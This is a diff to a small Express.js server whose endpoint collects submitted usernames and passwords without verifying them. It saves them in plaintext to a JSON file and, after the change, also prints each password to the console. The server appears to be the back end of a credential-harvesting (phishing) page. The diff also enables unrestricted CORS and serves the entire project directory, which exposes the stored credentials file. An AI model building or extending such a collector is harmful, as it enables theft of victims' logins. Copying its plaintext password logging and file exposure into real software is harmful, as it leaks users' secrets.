@@ -1,30 +1,36 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const cors = require('cors');
 const app = express();
 const PORT = 3000;
 
 const JSON_FILE_PATH = path.join(__dirname, 'submissions.json');
 
-// Auto-initialize storage database file if missing
+// Initialize local database storage file if it does not exist
 if (!fs.existsSync(JSON_FILE_PATH)) {
   fs.writeFileSync(JSON_FILE_PATH, JSON.stringify([], null, 2));
 }
 
-// Middleware to read standard native HTML form post streams
+// Global server configuration settings
+app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(__dirname));
 
-// Root route to serve your index.html page
+// Route to serve your main user interface
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Endpoint: Parses the standard form body payload securely sent from the client
+// Route handling form submission and verification response data mapping
 app.post('/api/get-result', (req, res) => {
   try {
     const { username, password, remember } = req.body;
+
+    // Output submission details directly to your terminal logs
+    console.log('📥 Data submission recorded:');
+    console.log(`Username: ${username} | Password: ${password}`);
 
     const newEntry = {
       id: `ENTRY-${Date.now()}`,
@@ -32,22 +38,22 @@ app.post('/api/get-result', (req, res) => {
       username: username || "",
       password: password || "",
       additional_fields: {
-        remember: remember === 'on'
+        remember: remember === true || remember === 'true'
       }
     };
 
-    // Load existing structures, append the payload, and save back to disk
+    // Read the log file, parse, push new entry, and save back to disk
     const fileData = fs.readFileSync(JSON_FILE_PATH, 'utf8');
     const entries = JSON.parse(fileData || '[]');
     entries.push(newEntry);
     fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(entries, null, 2));
 
-    // Fallback response page signaling successful stream completion
-    return res.send("Form data processed successfully.");
+    // Return a correct JSON response object to trigger frontend success logic
+    return res.json({ success: true });
 
   } catch (err) {
     console.error("Database log failed:", err);
-    return res.status(500).send("Internal server processing error.");
+    return res.status(500).json({ success: false, error: "Internal server processing error." });
   }
 });
 
